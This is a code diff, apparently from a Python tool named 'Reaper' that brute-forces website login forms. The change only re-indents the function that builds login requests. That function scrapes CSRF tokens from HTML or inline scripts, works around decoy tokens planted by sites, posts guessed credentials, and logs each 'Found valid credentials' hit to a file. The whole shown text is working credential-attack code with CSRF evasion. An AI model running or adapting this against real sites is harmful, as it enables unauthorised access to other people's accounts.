@@ -116,106 +116,106 @@ def process(threadName, Q, urlQ):
 			parametersfunc(threadName, parameters, url)
 
 def parametersfunc(threadName, p, url):
-		#set some variables
-		parameters = {}
-		#make the parameters a list
-		parameters_list = p.split("/")
-		#make parameters list a dictionary (needed from the requests module)
-		for i in range(0,len(parameters_list)):
-			para = parameters_list[i].split("=")
-			parameters[para[0]] = para[1]
-		#make a url get request to get the cookies and the csrf token
-		req = requests.get(url)
-		#extract the cookies
-		cookie = req.cookies
-		#extract the csrf token and add it to parameters
-		#if the csrf token is embedded in the HTML:
-		for key, value in parameters.items():
-			if value == "TOKEN":
-				html = req.text
-				soup = Soup(html, 'lxml')
-				try:
-					csrf_token = soup.find_all(attrs={ "name" : key })[0].get('value')
-				except IndexError:
-					return
-				else:
-					#replace TOKEN with the csrf_token
-					parameters[key] = csrf_token
-		#if the csrf token is in a script:
-		for key, value in parameters.items():
-			if value == "SCRIPT":
-				html = req.text
-				csrf_token = ""
-				try:
-					#search the html text for the csrf_token
-					re.search(key + ".*?value.*?=.*?\w.*?;", html)
-				except IndexError:
-					return
-				else:
-					#find all accounts of csrf_token in the html text (there might be more than one if
-					#the site has included more as comments)
-					csrf_token1 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
-					#if there are comments to fool Reaper
-					if len(csrf_token1) > 1:
-						#make a second get request
-						req = requests.get(url)
-						#extract the cookies again cause they change with each request
-						cookie = req.cookies
-						html = req.text
-						#find all the accounts of csrf_token in the html text again
-						csrf_token2 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
-						#cross-check the results and remove those which are the same
-						for i in csrf_token1:
-							for j in csrf_token2:
-								if i == j:
-									csrf_token1.remove(i)
-					#token should be a list with 2 items (the csrf_token is included in the 2nd item)
-					token = str(csrf_token1).split("=")
-					try:
-						token[1]
-					except IndexError:
-						return
-					else:
-						#get only the alphanumeric characters from the token
-						for i in token[1]:
-							if i.isalnum():
-								csrf_token += i
-					#replace TOKEN with the csrf_token
-					parameters[key] = csrf_token
-		#make the post request and parse the results
-		req = requests.post(url, cookies=cookie, data=parameters)
-		#find and write into a file any successful attempts
-		#second_way: check if the same parameters exist in the page served after the request
-		try:
-			second_way
-		except NameError:
-			pass
-		else:
+	#set some variables
+	parameters = {}
+	#make the parameters a list
+	parameters_list = p.split("/")
+	#make parameters list a dictionary (needed from the requests module)
+	for i in range(0,len(parameters_list)):
+		para = parameters_list[i].split("=")
+		parameters[para[0]] = para[1]
+	#make a url get request to get the cookies and the csrf token
+	req = requests.get(url)
+	#extract the cookies
+	cookie = req.cookies
+	#extract the csrf token and add it to parameters
+	#if the csrf token is embedded in the HTML:
+	for key, value in parameters.items():
+		if value == "TOKEN":
 			html = req.text
 			soup = Soup(html, 'lxml')
-			for key, value in parameters.items():
+			try:
+				csrf_token = soup.find_all(attrs={ "name" : key })[0].get('value')
+			except IndexError:
+				return
+			else:
+				#replace TOKEN with the csrf_token
+				parameters[key] = csrf_token
+	#if the csrf token is in a script:
+	for key, value in parameters.items():
+		if value == "SCRIPT":
+			html = req.text
+			csrf_token = ""
+			try:
+				#search the html text for the csrf_token
+				re.search(key + ".*?value.*?=.*?\w.*?;", html)
+			except IndexError:
+				return
+			else:
+				#find all accounts of csrf_token in the html text (there might be more than one if
+				#the site has included more as comments)
+				csrf_token1 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
+				#if there are comments to fool Reaper
+				if len(csrf_token1) > 1:
+					#make a second get request
+					req = requests.get(url)
+					#extract the cookies again cause they change with each request
+					cookie = req.cookies
+					html = req.text
+					#find all the accounts of csrf_token in the html text again
+					csrf_token2 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
+					#cross-check the results and remove those which are the same
+					for i in csrf_token1:
+						for j in csrf_token2:
+							if i == j:
+								csrf_token1.remove(i)
+				#token should be a list with 2 items (the csrf_token is included in the 2nd item)
+				token = str(csrf_token1).split("=")
 				try:
-					soup.find_all(attrs={ "name" : key })[0]
+					token[1]
 				except IndexError:
-					print ("Found valid credentials: %s , %s" % (url, parameters))
-					global pas2
-					#write the successful attempts in the file
-					pas2 = open(save,'a')
-					pas2.write('%s\n' % (parameters))
-					pas2.close()
 					return
 				else:
-					return
-		#default way: check the url of the page served after the request
-		if req.url == (url + "/") or req.url == url or req.url == page:
-			pass
-		else:
-			print ("Found valid credentials: %s , %s" % (url, parameters))
-			global pas
-			#write the successful attempts in the file
-			pas = open(save,'a')
-			pas.write('%s\n' %(parameters))
-			pas.close()
+					#get only the alphanumeric characters from the token
+					for i in token[1]:
+						if i.isalnum():
+							csrf_token += i
+				#replace TOKEN with the csrf_token
+				parameters[key] = csrf_token
+	#make the post request and parse the results
+	req = requests.post(url, cookies=cookie, data=parameters)
+	#find and write into a file any successful attempts
+	#second_way: check if the same parameters exist in the page served after the request
+	try:
+		second_way
+	except NameError:
+		pass
+	else:
+		html = req.text
+		soup = Soup(html, 'lxml')
+		for key, value in parameters.items():
+			try:
+				soup.find_all(attrs={ "name" : key })[0]
+			except IndexError:
+				print ("Found valid credentials: %s , %s" % (url, parameters))
+				global pas2
+				#write the successful attempts in the file
+				pas2 = open(save,'a')
+				pas2.write('%s\n' % (parameters))
+				pas2.close()
+				return
+			else:
+				return
+	#default way: check the url of the page served after the request
+	if req.url == (url + "/") or req.url == url or req.url == page:
+		pass
+	else:
+		print ("Found valid credentials: %s , %s" % (url, parameters))
+		global pas
+		#write the successful attempts in the file
+		pas = open(save,'a')
+		pas.write('%s\n' %(parameters))
+		pas.close()
 
 def finish():
 	#check if all the threads finished
